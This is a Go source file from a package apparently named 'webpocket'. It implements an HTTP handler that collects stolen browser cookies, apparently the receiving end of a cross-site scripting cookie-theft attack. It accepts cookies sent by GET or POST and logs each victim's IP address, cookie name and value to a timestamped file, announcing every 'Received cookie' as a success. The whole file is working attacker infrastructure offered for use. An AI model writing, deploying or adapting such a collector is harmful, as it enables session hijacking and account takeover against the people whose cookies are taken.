package webpocket

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"errors"
	"time"
)

type CookieReceiver struct {
	CookieLog *os.File
}

func (cr *CookieReceiver) CreateCookieLog(path string) {

	// "cookielog_time.txt" = default value from --cl flag
	if path == "cookielog_time.txt" {
		now := time.Now().Unix()
		path = fmt.Sprintf("cookielog_%d.txt", now)
	}

	// TODO: assume log does not exist and change logExists to true if it does
	logExists := true
	if _, err := os.Stat(path); errors.Is(err, os.ErrNotExist) {
		logExists = false
	}

	logFile, err := os.OpenFile(path, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		if !Quite {
			log.Printf("%s Error creating cookielog file\n", LogErr)
		}
		return 
	}

	if !logExists {
		fmt.Fprintf(logFile, "From%sKey%sValue\n", CookieLogDelim, CookieLogDelim)
	}
	cr.CookieLog = logFile
}

func (cr *CookieReceiver) ReceiveCookies(w http.ResponseWriter, r *http.Request) {

	switch r.Method {

	case "GET":
		getParams := r.URL.Query()
		for key, vals := range getParams {
			val := strings.Join(vals, "; ")
			fmt.Fprintf(cr.CookieLog, "%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, key, CookieLogDelim, val)
			if !Quite {
				log.Printf("%s Received cookie:\n", LogSuccess)
				fmt.Printf("%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, key, CookieLogDelim, val)
			}
		}

	case "POST":
		scanner := bufio.NewScanner(r.Body)
		scanner.Scan()
		cookies := strings.Split(scanner.Text(), "; ")

		for _, val := range cookies {
			cookieBuf := strings.SplitN(val, "=", 2)

			if cookieBuf[1] == "" {
				cookieBuf[1] = "[NULL]"
			}
			fmt.Fprintf(cr.CookieLog, "%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, cookieBuf[0], CookieLogDelim, cookieBuf[1])

			if !Quite {
				log.Printf("%s Received cookie:\n", LogSuccess)
				fmt.Printf("%s%s%s%s%s\n", r.RemoteAddr, CookieLogDelim, cookieBuf[0], CookieLogDelim, cookieBuf[1])
			}
		}

	}
}
